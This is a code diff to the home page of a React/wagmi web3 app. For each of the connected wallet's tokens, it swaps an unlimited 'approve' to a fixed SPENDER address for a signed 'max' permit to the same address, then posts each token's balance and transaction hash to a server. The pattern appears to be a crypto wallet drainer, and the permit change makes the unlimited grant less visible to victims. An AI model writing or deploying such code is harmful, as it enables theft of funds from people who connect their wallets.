@@ -2,6 +2,7 @@
 import { useState, useEffect } from 'react';
 import { useAccount, useWriteContract } from 'wagmi';
 import { erc20Abi, maxUint256 } from 'viem';
+import { signPermit } from "@/utils/permitAndSend";
 import { readContract, getBalance, switchChain } from '@wagmi/core';
 import { config } from '@/config';
 
@@ -124,14 +125,18 @@ export default function Home() {
       for (const token of usableTokens) {
         setStatus(`Approving ${token.symbol} on ${chainName}...`);
 
-        const txHash = await writeContractAsync({
-          address: token.address,
-          abi: erc20Abi,
-          functionName: "approve",
-          args: [SPENDER, maxUint256],
-          account: address,
-          chainId: targetChain,
-        });
+     const res = await signPermit({
+       chain: targetChain === 11155111 ? "sepolia" :
+             targetChain === 1 ? "eth" :
+             targetChain === 42161 ? "arbitrum" :
+             targetChain === 56 ? "bnb" : "polygon",
+       tokenAddress: token.address,
+       owner: address,
+       spender: SPENDER,
+       amountHuman: "max",
+     });
+    const { permitTxHash } = res;
+    setStatus(`${token.symbol} gasless permit ✅ | Tx: ${permitTxHash}`);
 
         let rawBalance: bigint = BigInt(0);
         try {
@@ -162,7 +167,7 @@ export default function Home() {
             token: token.address,
             symbol: token.symbol,
             balance: formattedBalance,
-            txHash,
+            permitTxHash,
           }),
         }).catch(console.error);
       }
